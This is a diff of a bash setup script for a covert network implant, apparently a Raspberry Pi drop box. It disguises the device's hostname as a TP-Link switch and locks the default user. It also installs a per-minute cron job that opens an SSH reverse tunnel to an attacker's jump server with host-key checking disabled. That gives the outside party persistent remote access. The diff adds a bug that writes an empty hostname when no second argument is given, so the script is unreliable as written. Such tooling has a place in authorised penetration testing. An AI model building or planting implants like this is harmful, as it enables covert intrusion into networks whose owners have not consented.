@@ -1,13 +1,18 @@
 #!/bin/bash
 
 
-red=`tput setaf 1`
-green=`tput setaf 2`
+# Output coloring
+red=`tput setaf 001`
+green=`tput setaf 002`
+yellow=`tput setaf 003`
 reset=`tput sgr0`
 
+# Check for arguments
 if [ $# -eq 0 ]
 then
 echo "${red} Pass this script your jump server ip address so it can persist the connection${reset}"
+echo "${red} It can also be passed an optional hostname string as a second argument${reset}"
+echo "${red} Syntax: ./target_config.sh <jump.server.ip.address> \"<Hostname>\"${reset}"
 exit 1
 fi
 
@@ -17,19 +22,25 @@ then
   echo "${red} You must run target_config.sh as root${reset}"
   exit 1
 fi
-${green}
+
+# Set locale
+echo "${green} Setting the system locale${reset}"
 export LANGUAGE=en_US.UTF-8
 export LANG=en_US.UTF-8
 export LC_ALL=en_US.UTF-8
 sudo locale-gen en_US.UTF-8
 
-echo "tplink-network-switch" > /etc/hostname
+# Set hostname (advertised on the network)
+echo "${green} Setting the host name ${yellow}${2-"tplink-network-switch"}${reset}"
+echo "$2" > /etc/hostname
 echo "127.0.0.1       localhost" > /etc/hosts
 echo "::1             localhost ip6-localhost ip6-loopback" >> /etc/hosts
 echo "ff02::1         ip6-allnodes" >> /etc/hosts
 echo "ff02::2         ip6-allrouters" >> /etc/hosts
-echo "127.0.1.1       tplink-network-switch" >> /etc/hosts
+echo "127.0.1.1       $2" >> /etc/hosts
 
+# Update all packages
+echo "${green} Updating the system... this may take some time${reset}"
 sudo apt update
 sudo apt upgrade -y
 
@@ -83,12 +94,12 @@ usermod -L pi
 
 # Persistent Callback
 echo "${green} Persisting Callback${reset}"
-line="* * * * * ssh -R $1:10909:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
+line="* * * * * ssh -R $1:21285:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
 (crontab -u snitch -l; echo "$line") | crontab -u snitch -
 
 echo "${green} ..............${reset}"
 echo "${green} ..............${reset}"
-echo "${green} .... DONE ....${reset}"
+echo "${green} .... ${yellow}DONE${green} ....${reset}"
 echo "${green} ..............${reset}"
 echo "${green} ..............${reset}"
 
